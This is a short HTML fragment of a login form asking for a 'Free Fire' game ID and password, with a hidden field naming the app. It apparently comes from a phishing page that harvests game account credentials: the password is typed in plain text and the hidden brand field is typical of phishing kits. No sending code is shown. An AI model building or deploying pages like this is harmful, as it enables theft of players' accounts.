...
<body >
 ...
 <form method="POST" action="" enctype="multipart/form-data">
    <input type="text" class="box" name="login" placeholder="FreeFire id" required><br>
    <input type="text"  class="box" name="password" placeholder="Password" required><br>
    <input type="text" name="AppName" value="Free Fire" hidden>
